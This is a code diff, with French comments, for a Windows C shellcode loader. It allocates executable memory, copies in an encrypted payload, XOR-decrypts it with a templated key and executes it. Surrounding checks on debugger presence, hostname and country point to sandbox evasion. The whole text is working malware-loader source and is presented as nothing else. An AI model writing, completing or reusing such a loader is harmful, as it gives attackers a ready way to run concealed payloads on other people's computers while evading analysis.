@@ -12,29 +12,36 @@ void main() {
 
     char k[] = "%KEY%";
     size_t k_len = strlen(k);
+    size_t ss = sizeof(msgbox_payload)-1;
     
     printf("is_debugged: %d\n", is_debugged);
     printf("hostname: %s\n", hostname);
     printf("size: %d\n", size);
     printf("country: %s\n", country);
 
+    printf("Key: %s\n", k);
+    printf("Key size: %zu\n", k_len);
+    printf("Shellcode size: %zu\n", ss);
 
-    size_t ss = sizeof(msgbox_payload);
-    DWORD oldProtect;
-    if (!VirtualProtect(msgbox_payload, ss, PAGE_READWRITE, &oldProtect)) {
-        printf("Error during VirtualProtect: %lu\n", GetLastError());
+    // 🔴 1. Allouer une mémoire exécutable
+    void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+        printf("❌ Erreur: Impossible d'allouer la mémoire (%lu)\n", GetLastError());
         return;
     }
 
-    // to fix
+    // 🔵 2. Copier le shellcode dans cette mémoire
+    memcpy(exec_mem, msgbox_payload, ss);
+
+    // 🟢 3. Déchiffrer le shellcode avec XOR
     if (k_len != 0) {
         for (size_t i = 0; i < ss; ++i) {
-            msgbox_payload[i] ^= k[i % k_len];
+            ((unsigned char*)exec_mem)[i] ^= k[i % k_len];
         }
     }
-    
 
-    ((void (*)())msgbox_payload)();
+    // 🟣 4. Exécuter le shellcode
+    ((void (*)())exec_mem)();
 }
 
 /*
